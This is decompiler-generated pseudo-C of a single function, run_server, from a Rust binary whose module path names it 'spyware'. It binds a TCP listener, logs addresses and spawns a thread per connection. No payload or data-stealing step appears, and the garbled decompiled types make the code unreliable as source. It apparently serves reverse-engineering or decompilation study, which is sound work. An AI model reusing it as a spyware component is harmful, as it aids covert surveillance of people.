long long spyware::communication::server::run_server(unsigned short a0)
{
    unsigned int v0;  // [bp-0x114]
    unsigned int v1;  // [bp-0x110]
    unsigned short v2;  // [bp-0x10a]
    unsigned long v3;  // [bp-0x108], Other Possible Types: unsigned long long
    unsigned int v4;  // [bp-0x106]
    unsigned short v5;  // [bp-0x102]
    unsigned long long v6;  // [bp-0x100]
    unsigned long long v7;  // [bp-0xf8]
    char *v8;  // [bp-0xf8], Other Possible Types: unsigned long, unsigned long long
    unsigned long long v9;  // [bp-0xf0]
    unsigned long long v10;  // [bp-0xe8]
    char *v11;  // [bp-0xe0], Other Possible Types: unsigned long long
    void* v12;  // [sp-0xd8], Other Possible Types: unsigned long
    unsigned int v13;  // [bp-0xd4]
    unsigned long long v14;  // [sp-0xd0]
    char *v15;  // [bp-0xc8], Other Possible Types: unsigned long long
    unsigned long long v16;  // [bp-0xc0]
    void* v17;  // [bp-0xb8]
    char v18;  // [bp-0xb0]
    char *v19;  // [bp-0xa8], Other Possible Types: struct struct_0 [8]
    unsigned int v20;  // [bp-0xa4]
    unsigned long long v21;  // [bp-0xa0]
    char *v22;  // [bp-0x98], Other Possible Types: struct struct_0[8]
    char *v23;  // [bp-0x98]
    unsigned int v24;  // [bp-0x96]
    unsigned short v25;  // [bp-0x92]
    unsigned long long v26;  // [bp-0x90]
    int v27;  // [bp-0x88]
    char *v28;  // [bp-0x78], Other Possible Types: char, unsigned long long
    unsigned long long v29;  // [bp-0x70]
    int v30;  // [bp-0x68]
    char v31;  // [bp-0x58]
    char v32;  // [bp-0x48]
    unsigned long long v34;  // rax
    unsigned long long v35;  // rax
    unsigned long long v36;  // rax
    unsigned long long v37;  // rax

    v2 = a0;
    v3 = &g_4b8d10;
    v6 = <&T as core::fmt::Display>::fmt;
    v8 = &v2;
    v9 = core::fmt::num::imp::<impl core::fmt::Display for u16>::fmt;
    v12 = &g_4b8ca0;
    v14 = 2;
    v17 = 0;
    v15 = &(char)v3;
    v16 = 2;
    v32.map_or_else(&(char)v12);
    (char)v12.bind(&v32);
    if (((char)v12 & 1))
        return 2;
    v1 = v13;
    v28.local_addr(&v1);
    if (*((short *)&v28) == 2)
    {
        v11 = v29;
        if (::0x44be40::core::sync::atomic::atomic_load())
        {
            v19 = &v11;
            v22 = &(char)v19;
            v26 = <&T as core::fmt::Display>::fmt;
            v12 = &g_4b8cd0;
            v14 = 2;
            v17 = 0;
            v15 = &(char)v22;
            v16 = 1;
            v34 = log::__private_api::loc(&g_4b8d38);
            v3 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
            v6 = 30;
            v8 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
            v9 = 30;
            v10 = v34;
            log::__private_api::log(&(char)v12, 1, &(char)v3);
        }
        ::0x44ba90::core::ptr::drop_in_place<std::io::error::Error>(&v11);
    }
    else
    {
        v27 = v30;
        *((int128_t *)&v22) = *((int128_t *)&v28);
        if (::0x44be40::core::sync::atomic::atomic_load() >= 3)
        {
            *((char **)&v19[0]) = &(char)v22;
            v21 = <core::net::socket_addr::SocketAddr as core::fmt::Debug>::fmt;
            v12 = &g_4b8cc0;
            v14 = 1;
            v17 = 0;
            v15 = &(char)v19;
            v16 = 1;
            v35 = log::__private_api::loc(&g_4b8d20);
            v3 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
            v6 = 30;
            v8 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
            v9 = 30;
            v10 = v35;
            log::__private_api::log(&(char)v12, 3, &(char)v3);
        }
    }
    v11 = &v1;
    while (true)
    {
        (char)v19.next(&v11);
        if (!(int)v19)
        {
            v0 = v20;
            if (::0x44be40::core::sync::atomic::atomic_load() >= 3)
            {
                (char)v3.peer_addr(&v0);
                if ((short)v3 == 2)
                {
                    ::0x44bab0::core::ptr::drop_in_place<std::net::tcp::TcpStream>(v0);
                    ::0x44bab0::core::ptr::drop_in_place<std::net::tcp::TcpStream>(v1);
                    return v6;
                }
                v25 = v5;
                v24 = v4;
                memcpy(&v31, &v8, 16);
                *((short *)&v22[0]) = v3;
                v26 = v6;
                memcpy(&v27, &v8, 16);
                v28 = &v22[0].field_0;
                v29 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
                v12 = &g_4b8cf0;
                v14 = 1;
                v17 = 0;
                v15 = &v28;
                v16 = 1;
                v37 = log::__private_api::loc(&g_4b8d68);
                v3 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
                v6 = 30;
                v7 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
                v9 = 30;
                v10 = v37;
                log::__private_api::log(&(char)v12, 3, &(char)v3);
            }
            v15 = 0x8000000000000000;
            v12 = 0;
            v18 = 0;
            (char)v3.spawn_unchecked(&(char)v12, v0);
            (char)v12.expect(&(char)v3);
            ::0x44b9d0::core::ptr::drop_in_place<std::thread::JoinHandle<core::result::Result<(),std::io::error::Error>>>(&(char)v12);
        }
        else if ((int)v19 == 1)
        {
            v28 = v21;
            if (::0x44be40::core::sync::atomic::atomic_load())
            {
                v23 = &v28;
                v26 = <std::io::error::Error as core::fmt::Display>::fmt;
                v12 = &g_4b8d00;
                v14 = 1;
                v17 = 0;
                v15 = &v22[0].field_0;
                v16 = 1;
                v36 = log::__private_api::loc(&g_4b8d98);
                v3 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
                v6 = 30;
                v7 = "spyware::communication::serverUnrecognized message typeAn error occurred, terminating connection with . Error: ";
                v9 = 30;
                v10 = v36;
                log::__private_api::log(&(char)v12, 1, &(char)v3);
            }
            ::0x44ba90::core::ptr::drop_in_place<std::io::error::Error>(&v28);
        }
        else
        {
            std::panicking::begin_panic("Server closed unexpectedlyfailed to spawn thread/root/.rustup/toolchains/nightly-2025-01-01-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/std/src/thread/mod.rs", 26, &g_4b8d50); /* do not return */
        }
    }
}
